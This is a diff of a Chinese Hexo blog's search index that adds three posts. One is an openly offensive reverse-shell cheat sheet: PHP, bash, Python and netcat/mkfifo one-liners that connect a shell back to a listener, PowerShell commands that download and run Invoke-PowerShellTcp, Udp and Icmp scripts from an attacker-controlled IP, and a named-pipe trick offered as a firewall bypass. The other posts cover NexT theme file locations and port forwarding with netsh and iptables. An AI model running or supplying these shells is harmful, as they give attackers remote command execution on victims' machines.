class="keyword">call</span>([&quot;/bin/sh&quot;,&quot;-i&quot;])&#x27;</span><br></pre></td></tr></table></figure>
+<p>mkfifo+php+nc主要条件</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$ip</span> = <span class="string">&#x27;192.168.xxx.xxx&#x27;</span>; </span><br><span class="line"><span class="variable">$port</span> = <span class="number">8080</span>;</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&quot;rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc <span class="subst">$ip</span> <span class="subst">$port</span> &gt; /tmp/f&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
-<h2 id="Windows-Reverse-Shell"><a href="#Windows-Reverse-Shell" class="headerlink" title="Windows Reverse Shell"></a>Windows Reverse Shell</h2><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#powercat反弹</span></span><br><span class="line">powershell <span class="built_in">IEX</span> (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&#x27;http://192.168.204.144:1234/Invoke-PowerShellTcp.ps1&#x27;</span>);<span class="built_in">Invoke-PowerShellTcp</span> <span class="literal">-Reverse</span> <span class="literal">-IPAddress</span> <span class="number">192.168</span>.<span class="number">204.144</span> <span class="literal">-port</span> <span class="number">4444</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Reverse UDP shell</span></span><br><span class="line">powershell <span class="built_in">IEX</span> (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&#x27;http://192.168.204.144:1234/Invoke-PowerShellUdp.ps1&#x27;</span>);<span class="built_in">Invoke-PowerShellUdp</span> <span class="literal">-Reverse</span> <span class="literal">-IPAddress</span> <span class="number">192.168</span>.<span class="number">204.144</span> <span class="literal">-port</span> <span class="number">6666</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Reverse ICMP shell</span></span><br><span class="line">powershell <span class="built_in">IEX</span> (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&#x27;http://192.168.204.144:1234/Invoke-PowerShellIcmp.ps1&#x27;</span>);<span class="built_in">Invoke-PowerShellIcmp</span> <span class="literal">-IPAddress</span> <span class="number">192.168</span>.<span class="number">204.144</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h2 id="RCE-Reverse-Shell"><a href="#RCE-Reverse-Shell" class="headerlink" title="RCE Reverse Shell"></a>RCE Reverse Shell</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#centos--反弹shell</span></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/<span class="number">10.</span>xx<span class="number">.0</span>.xx/<span class="number">8080</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br><span class="line"><span class="comment">#宿主</span></span><br><span class="line">nc -lvnp <span class="number">8080</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Python-Reverse-Shell"><a href="#Python-Reverse-Shell" class="headerlink" title="Python Reverse Shell"></a>Python Reverse Shell</h2><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">python3 -c &#x27;import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;<span class="number">192</span>.<span class="number">168</span>.xx.xx&quot;,监听端口));os.dup2(s.fileno(),<span class="number">0</span>);os.dup2(s.fileno(),<span class="number">1</span>);os.dup2(s.fileno(),<span class="number">2</span>);pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line"></span><br><span class="line">#python</span><br><span class="line">python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;<span class="number">10</span>.<span class="number">0</span>.xx.xx&quot;,<span class="number">8080</span>));os.dup2(s.fileno(),<span class="number">0</span>);os.dup2(s.fileno(),<span class="number">1</span>);os.dup2(s.fileno(),<span class="number">2</span>);subprocess.<span class="keyword">call</span>([&quot;/bin/sh&quot;,&quot;-i&quot;])&#x27;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Windows-Reverse-Shell"><a href="#Windows-Reverse-Shell" class="headerlink" title="Windows Reverse Shell"></a>Windows Reverse Shell</h2><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#powercat反弹</span></span><br><span class="line">powershell <span class="built_in">IEX</span> (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&#x27;http://192.168.xxx.144:1234/Invoke-PowerShellTcp.ps1&#x27;</span>);<span class="built_in">Invoke-PowerShellTcp</span> <span class="literal">-Reverse</span> <span class="literal">-IPAddress</span> <span class="number">192.168</span>.xxx.<span class="number">144</span> <span class="literal">-port</span> <span class="number">4444</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Reverse UDP shell</span></span><br><span class="line">powershell <span class="built_in">IEX</span> (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&#x27;http://192.168.xxx.144:1234/Invoke-PowerShellUdp.ps1&#x27;</span>);<span class="built_in">Invoke-PowerShellUdp</span> <span class="literal">-Reverse</span> <span class="literal">-IPAddress</span> <span class="number">192.168</span>.xxx.<span class="number">144</span> <span class="literal">-port</span> <span class="number">6666</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Reverse ICMP shell</span></span><br><span class="line">powershell <span class="built_in">IEX</span> (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&#x27;http://192.168.xxx.144:1234/Invoke-PowerShellIcmp.ps1&#x27;</span>);<span class="built_in">Invoke-PowerShellIcmp</span> <span class="literal">-IPAddress</span> <span class="number">192.168</span>.xxx.<span class="number">144</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <p><a href="https://github.com/besimorhino/powercat">工具</a></p>
 <p><a href="https://cloud.tencent.com/developer/article/2485156">Windows环境下反弹shell各类姿势-腾讯云开发者社区-腾讯云</a></p>
+<h1 id="绕过防火墙"><a href="#绕过防火墙" class="headerlink" title="绕过防火墙"></a>绕过防火墙</h1><p><strong>FIFO（First In, First Out）</strong> 也就是 <strong>命名管道（Named Pipe）</strong>，是一个极其强大的工具。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc 192.168.1.1 8080 -e /bin/sh -&gt; 报错 invalid option -- e。</span><br><span class="line"></span><br><span class="line">FIFO 绕过： ```bash</span><br><span class="line">mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc 192.168.1.1 8080 &gt; /tmp/f</span><br></pre></td></tr></table></figure>
+
 ]]></content>
       <categories>
         <category>Cybersecurity</category>
       </categories>
       <tags>
         <tag>payload</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>next主题的自定义文件</title>
+    <url>/2026/02/09/next%E4%B8%BB%E9%A2%98%E7%9A%84%E6%96%87%E4%BB%B6/</url>
+    <content><![CDATA[<h1 id="0-前言"><a href="#0-前言" class="headerlink" title="0-前言"></a>0-前言</h1><p>记录一下<code>hexo</code>的<code>next</code>主题的一些文件是在哪些位置，以防下次想改又要去找，至于怎么改，丢给文本模型跑就行了</p>
+<p><code>NexT version 8.21.1</code></p>
+<span id="more"></span>
+
+<h1 id="1-位置"><a href="#1-位置" class="headerlink" title="1-位置"></a>1-位置</h1><h2 id="1-自定义样式"><a href="#1-自定义样式" class="headerlink" title="1&gt;自定义样式"></a>1&gt;自定义样式</h2><p>next主题下面的<code>_config.yml</code></p>
+<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">custom_file_path:</span></span><br><span class="line">  <span class="comment">#head: source/_data/head.njk</span></span><br><span class="line">  <span class="comment">#header: source/_data/header.njk</span></span><br><span class="line">  <span class="comment">#sidebar: source/_data/sidebar.njk</span></span><br><span class="line">  <span class="comment">#postMeta: source/_data/post-meta.njk</span></span><br><span class="line">  <span class="comment">#postBodyStart: source/_data/post-body-start.njk</span></span><br><span class="line">  <span class="comment">#postBodyEnd: source/_data/post-body-end.njk</span></span><br><span class="line">  <span class="comment">#footer: source/_data/footer.njk</span></span><br><span class="line">  <span class="comment">#bodyEnd: source/_data/body-end.njk</span></span><br><span class="line">  <span class="comment">#variable: source/_data/variables.styl</span></span><br><span class="line">  <span class="comment">#mixin: source/_data/mixins.styl</span></span><br><span class="line">  <span class="comment">#style: source/_data/styles.styl</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">#style: source/_data/styles.styl</span><br><span class="line">用于更改栏目的透明度、鼠标悬停时的效果、优化手机端的体验都可以从这里改</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">#variable: source/_data/variables.styl</span><br><span class="line">圆角设置等</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">#bodyEnd: source/_data/body-end.njk</span><br><span class="line">页面上新增标签按钮啥的</span><br></pre></td></tr></table></figure>
+
+<p>值得注意的是，<code>source/_data/body-end.njk</code>等这些是<code>blog</code>下面的<code>source</code>不是<code>next</code>主题下的<code>source</code></p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">你博客的绝对路径\blog\source\_data\body-end.njk</span><br></pre></td></tr></table></figure>
+
+<p>其他的我没用到，暂时就不说了</p>
+<h2 id="2-固有的样式更改"><a href="#2-固有的样式更改" class="headerlink" title="2&gt;固有的样式更改"></a>2&gt;固有的样式更改</h2><h3 id="Hexo-NexT-主题侧边栏"><a href="#Hexo-NexT-主题侧边栏" class="headerlink" title="Hexo NexT 主题侧边栏"></a><code>Hexo NexT</code> 主题侧边栏</h3><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">你博客的绝对路径\blog\themes\next\layout\_partials\sidebar\site-overview.njk</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="3-置顶、排序、分页"><a href="#3-置顶、排序、分页" class="headerlink" title="3&gt;置顶、排序、分页"></a>3&gt;置顶、排序、分页</h2><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">#如果改了根目录下的config里的order_by还不行的话可以试试这个</span><br><span class="line">你博客的绝对路径\blog\node_modules\hexo-generator-index\lib\generator.js</span><br></pre></td></tr></table></figure>
+
+<p>参考文章：<a href="https://hubojing.github.io/dhygztfl/">Hexo根据更新时间修改文章排序机制</a></p>
+<p>待续。。。</p>
+]]></content>
+      <categories>
+        <category>article</category>
+      </categories>
+      <tags>
+        <tag>article</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>代理记录</title>
+    <url>/2025/08/27/%E4%BB%A3%E7%90%86%E8%AF%A6%E8%A7%A3/</url>
+    <content><![CDATA[<h1 id="0-前言"><a href="#0-前言" class="headerlink" title="0-前言"></a>0-前言</h1><p>​	今天琢磨端口映射的时候懒得输入内网地址，想直接用回显地址找到端口服务的时候硬是找不到</p>
+<h6 id="1-回显地址默认不经代理的解决办法"><a href="#1-回显地址默认不经代理的解决办法" class="headerlink" title="1&gt;回显地址默认不经代理的解决办法"></a>1&gt;回显地址默认不经代理的解决办法</h6><p><a href="https://stackoverflow.com/questions/57419408/how-to-make-firefox-use-a-proxy-server-for-localhost-connections#:~:text=You%20have%20to%20change%20another,in%20about%3Aconfig">stackoverflow网址中的解决办法</a></p>
+<p>简单来说就是进入浏览器的高级配置的首选项进行更改，主要原因在于浏览器的配置默认回显地址不经过代理，如下以火狐浏览器为例：</p>
+<p><img src="/../image/proxy-/1.png"></p>
+<span id="more"></span>
+
+<h1 id="1-局域网映射端口"><a href="#1-局域网映射端口" class="headerlink" title="1-局域网映射端口"></a>1-局域网映射端口</h1><h6 id="1-内网穿透-局域网端口映射"><a href="#1-内网穿透-局域网端口映射" class="headerlink" title="1&gt;内网穿透-&gt;局域网端口映射"></a>1&gt;内网穿透-&gt;局域网端口映射</h6><p>假设我连接了内网的wifi，然后访问它的web服务192.168.123.1:8080，现在我电脑开热点给其他人，让其他人访问内网的web服务，我怎么将192.168.123.1映射到我的热点（热点为nat模式）</p>
+<p>#<strong>解决方案</strong></p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">##windows</span><br><span class="line">netsh interface portproxy add v4tov4 listenaddress=<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span> listenport=<span class="number">8080</span> connectaddress=<span class="number">192</span>.<span class="number">168</span>.<span class="number">123</span>.<span class="number">1</span> connectport=<span class="number">8080</span></span><br><span class="line">---</span><br><span class="line">#如果更多的端口映射</span><br><span class="line"><span class="comment">rem 映射Web服务 (HTTP)</span></span><br><span class="line">netsh interface portproxy add v4tov4 listenaddress=<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span> listenport=<span class="number">80</span> connectaddress=<span class="number">192</span>.<span class="number">168</span>.<span class="number">123</span>.<span class="number">1</span> connectport=<span class="number">80</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">rem 映射HTTPS服务</span></span><br><span class="line">netsh interface portproxy add v4tov4 listenaddress=<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span> listenport=<span class="number">443</span> connectaddress=<span class="number">192</span>.<span class="number">168</span>.<span class="number">123</span>.<span class="number">1</span> connectport=<span class="number">443</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">rem 映射远程桌面 (RDP)</span></span><br><span class="line">netsh interface portproxy add v4tov4 listenaddress=<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span> listenport=<span class="number">3389</span> connectaddress=<span class="number">192</span>.<span class="number">168</span>.<span class="number">123</span>.<span class="number">1</span> connectport=<span class="number">3389</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">rem 映射SSH服务</span></span><br><span class="line">netsh interface portproxy add v4tov4 listenaddress=<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span> listenport=<span class="number">22</span> connectaddress=<span class="number">192</span>.<span class="number">168</span>.<span class="number">123</span>.<span class="number">1</span> connectport=<span class="number">22</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">rem 映射你之前设置的8080端口</span></span><br><span class="line">netsh interface portproxy add v4tov4 listenaddress=<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span> listenport=<span class="number">8080</span> connectaddress=<span class="number">192</span>.<span class="number">168</span>.<span class="number">123</span>.<span class="number">1</span> connectport=<span class="number">8080</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">rem 映射SMB文件共享</span></span><br><span class="line">netsh interface portproxy add v4tov4 listenaddress=<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span> listenport=<span class="number">445</span> connectaddress=<span class="number">192</span>.<span class="number">168</span>.<span class="number">123</span>.<span class="number">1</span> connectport=<span class="number">445</span></span><br><span class="line"></span><br><span class="line">##linux</span><br><span class="line">#启用IP转发（临时）</span><br><span class="line">sudo sysctl -w <span class="built_in">net</span>.ipv4.ip_forward=<span class="number">1</span></span><br><span class="line">#永久</span><br><span class="line">sudo nano /etc/sysctl.conf</span><br><span class="line">#更新</span><br><span class="line">sudo sysctl -p</span><br><span class="line"># 将目标为热点IP:<span class="number">8080</span>的包，转发到内网服务器</span><br><span class="line">sudo iptables -t nat -A PREROUTING -p tcp -i wlan1 --dport <span class="number">8080</span> -j DNAT --to-destination <span class="number">192</span>.<span class="number">168</span>.<span class="number">123</span>.<span class="number">1</span>:<span class="number">8080</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">#查看转发的表-windows</span><br><span class="line">netsh interface portproxy show all</span><br><span class="line">#删除对应的表</span><br><span class="line">netsh interface portproxy delete v4tov4 listenaddress=<span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">123</span> listenport=<span class="number">8080</span></span><br><span class="line">#清除转发表</span><br><span class="line">netsh interface portproxy reset</span><br><span class="line">#增加对应的转发</span><br><span class="line">netsh interface portproxy add v4tov4 listenaddress=<span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">123</span> listenport=<span class="number">8080</span> connectaddress=<span class="number">172</span>.<span class="number">16</span>.<span class="number">5</span>.<span class="number">2</span> connectport=<span class="number">8080</span></span><br></pre></td></tr></table></figure>
+
+<p>当然直接用<strong>Ngrok &#x2F; FRP (Fast Reverse Proxy) &#x2F; ew</strong>等穿透工具都可以</p>
+<p>无互联网开热点的解决方案如下：</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">##windows</span><br><span class="line">netsh wlan <span class="built_in">set</span> hostednetwork <span class="built_in">mode</span>=allow ssid=MyHotspot key=MyPassword123</span><br><span class="line">#开启</span><br><span class="line">netsh wlan <span class="built_in">start</span> hostednetwork</span><br><span class="line">#关闭</span><br><span class="line">netsh wlan stop hostednetwork</span><br><span class="line">#查看</span><br><span class="line">netsh wlan show hostednetwork</span><br><span class="line">#删除</span><br><span class="line">netsh wlan <span class="built_in">set</span> hostednetwork <span class="built_in">mode</span>=disallow</span><br><span class="line">#检查是否可以</span><br><span class="line">netsh wlan show drivers</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>Cybersecurity</category>
+      </categories>
+      <tags>
+        <tag>article</tag>
       </tags>
   </entry>
   <entry>
